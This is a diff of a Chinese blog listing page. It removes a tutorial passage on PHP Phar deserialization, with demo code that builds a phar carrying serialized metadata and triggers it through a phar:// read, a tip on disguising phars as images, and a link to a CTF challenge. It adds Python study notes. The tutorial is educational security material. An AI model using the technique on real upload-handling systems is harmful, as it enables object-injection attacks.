-<p>4.[optional] a signature for verifying Phar integrity (phar file format only)</p>
-<p>签名，会被放在文件的结尾。</p>
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-25.png" alt="img"></p>
-<h4 id="Phar攻击的实现"><a href="#Phar攻击的实现" class="headerlink" title="Phar攻击的实现"></a>Phar攻击的实现</h4><blockquote>
-<p>demo测试</p>
-</blockquote>
-<p>注意：要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub </span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件 </span></span><br><span class="line"><span class="comment">//签名自动计算 </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-26-1024x543.png" alt="img"></p>
-<p>使用winhex打开phar.phar文件，发现meta-data是以序列化形式存储的</p>
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-27-1024x207.png" alt="img"></p>
-<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化。</p>
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-28.png" alt="img"></p>
-<blockquote>
-<p>demo2测试</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-29-1024x545.png" alt="img"></p>
-<p>因为phar文件只对<code>__HALT_COMPILER();?&gt;</code>这段代码有要求，所以我们可以将其伪造成一张图片或者其他形式进行利用。</p>
-<p>题目：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SWPUCTF%202018]SimplePHP">SWPUCTF 2018SimplePHP</a></p>
-<p>题目wp：<a target="_blank" rel="noopener" href="https://www.threeyear.com.cn/archives/3670">buuctf-web【SWPUCTF 2018】SimplePHP</a></p>
-<p>参考文章：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/106909777?ops_request_misc=%7B%22request_id%22:%22166182244716782388047406%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=166182244716782388047406&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-106909777-null-null.nonecase&utm_term=phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450">由浅入深理解PHP反序列化</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/106909777?ops_request_misc=%7B%22request_id%22:%22166182244716782388047406%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=166182244716782388047406&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-106909777-null-null.nonecase&utm_term=phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450">漏洞</a></li>
-<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/377676274">PHP反序列化研究</a></li>
+</li>
 </ul>
-<p>持续更新中……</p>
-<p>如果文章有何不妥之处，请您指出。</p>
+<h4 id="数据容器的通用操作"><a href="#数据容器的通用操作" class="headerlink" title="数据容器的通用操作"></a>数据容器的通用操作</h4><ul>
+<li>遍历上：<ul>
+<li>五类数据容器都支持for循环</li>
+<li>只有列表、元组、字符串支持while循环，集合、字典不支持</li>
+</ul>
+</li>
+<li>len(容器)</li>
+<li>max(容器)：最大元素</li>
+<li>min(容器)：最小函数</li>
+<li>容器的通用转换功能<ul>
+<li>list(容器)：将给定容器转换为列表</li>
+<li>str(容器)：将给定容器转换为字符串</li>
+<li>tuple(容器)：将给定容器转换为元组</li>
+<li>set(容器)：将给定容器转换为集合</li>
+</ul>
+</li>
+<li>容器通用排序<ul>
+<li>sorted(容器,[reverse&#x3D;True])：将给定容器进行排序</li>
+<li>reverse表示反转</li>
+<li>排序的结果会变成列表对象</li>
+</ul>
+</li>
+</ul>
+<h2 id="python函数进阶"><a href="#python函数进阶" class="headerlink" title="python函数进阶"></a>python函数进阶</h2><h4 id="函数的多返回值"><a href="#函数的多返回值" class="headerlink" title="函数的多返回值"></a>函数的多返回值</h4><ul>
+<li>函数的多返回值的数据类型没有要求</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-57-1024x539.png"></p>
+<h4 id="函数的多种传参方式"><a href="#函数的多种传参方式" class="headerlink" title="函数的多种传参方式"></a>函数的多种传参方式</h4><ul>
+<li>函数参数种类<ul>
+<li>位置参数：<ul>
+<li>调用函数时根据函数定义的参数位置来传递参数</li>
+<li>注意：顺序和个数必须一致</li>
+</ul>
+</li>
+<li>关键字参数：<ul>
+<li>函数调用时通过<code>键=值</code>的方式传参</li>
+<li>函数调用时，如果有位置参数时，位置参数必须在关键字参数的前面，但关键字参数之间不存在先后顺序</li>
+</ul>
+</li>
+<li>缺省参数：<ul>
+<li>也叫默认参数，用于定义函数，为参数提供默认值，调用时可以不传则会以默认值传入</li>
+<li>设置默认值的参数必须放在后面</li>
+</ul>
+</li>
+<li>不定长参数：<ul>
+<li>也叫可变参数，用于不确定调用的时候会传递多少个参数（不传参也可以）</li>
+<li>不定长参数的类型<ul>
+<li>位置传递：使用<code>*</code></li>
+<li>关键字传递：使用<code>**</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-58-1024x539.png"></p>
+<h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><ul>
+<li>函数作为参数传递<ul>
+<li>将函数自身传递到其他函数内</li>
+<li>函数传入的作用：传入计算逻辑，而非传入数据</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-59-1024x543.png"></p>
+<ul>
+<li>lambda匿名函数<ul>
+<li>函数定义的类型：<ul>
+<li>def关键字，定义带有名称的函数，可以重复使用</li>
+<li>lambda关键字，可以定义匿名的函数（无名称），只可以临时使用一次</li>
+</ul>
+</li>
+<li>匿名函数的定义语法：<ul>
+<li>lambda 传入参数:函数体(一行代码)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-60-1024x548.png"></p>
+<h2 id="python的文件操作"><a href="#python的文件操作" class="headerlink" title="python的文件操作"></a>python的文件操作</h2><h4 id="文件的编码"><a href="#文件的编码" class="headerlink" title="文件的编码"></a>文件的编码</h4><ul>
+<li>常用的编码：UTF-8、GBK</li>
+</ul>
+<h4 id="文件的读取"><a href="#文件的读取" class="headerlink" title="文件的读取"></a>文件的读取</h4><ul>
+<li>文件的操作主要包括打开、关闭、读、写等操作</li>
+<li>打开文件：open(name,mode,encoding)<ul>
+<li>name：是要打开的目标文件的字符串（可以包含文件所在的具体路径）</li>
+<li>mode：设置打开文件的模式（访问模式）：只读<code>(r)</code>、写入<code>(w)</code>、追加<code>(a)</code>等</li>
+<li>encoding：编码格式</li>
+</ul>
+</li>
+<li>读操作相关方法<ul>
+<li>read()方法：文件对象.read(num)<ul>
+<li>num表示要从文件中读取的数据的长度（单位是字节），如果没有传入num，那么就表示读取文件中所有的数据。</li>
+</ul>
+</li>
+<li>readlines()方法：<ul>
+<li>读取多行内容</li>
+<li>可以按照行的方式把整个文件中的内容进行一次性读取，并且返回的是一个<code>列表</code>，其中每一行的数据为一个元素</li>
+</ul>
+</li>
+<li>readline()方法<ul>
+<li>一次读取一行内容</li>
+</ul>
+</li>
+<li>for循环读取文件行</li>
+<li>close()：关闭文件对象</li>
+<li>with open语法：自动完成对文件的close</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-61-1024x543.png"></p>
+<h4 id="文件的写入"><a href="#文件的写入" class="headerlink" title="文件的写入"></a>文件的写入</h4><ul>
+<li>write()：文件写入</li>
+<li>flush()：内容刷新</li>
+<li>注意：<ul>
+<li>w模式，文件不存在，会创建新文件</li>
+<li>w模式，文件存在，会清空原有文件</li>
+<li>close()方法，带有flush()方法的功能</li>
+</ul>
+</li>
+</ul>
+<h4 id="文件的追加"><a href="#文件的追加" class="headerlink" title="文件的追加"></a>文件的追加</h4><ul>
+<li>模式替换为a</li>
+<li>文件存在会追加</li>
+<li>文件不存在会创建文件</li>
+<li>可以使用”\n”来写入换行符</li>
+</ul>
+<p>第二部分学完了，继续加油……</p>
+<p>如果文章有何不妥之处，请您指出。持续更新中……</p>
 
       
     </div>
@@ -483,7 +743,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/30/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/30/">30</a><span class="page-number current">31</span><a class="page-number" href="/page/32/">32</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/32/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/30/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/30/">30</a><span class="page-number current">31</span><a class="page-number" href="/page/32/">32</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/32/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -507,7 +767,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
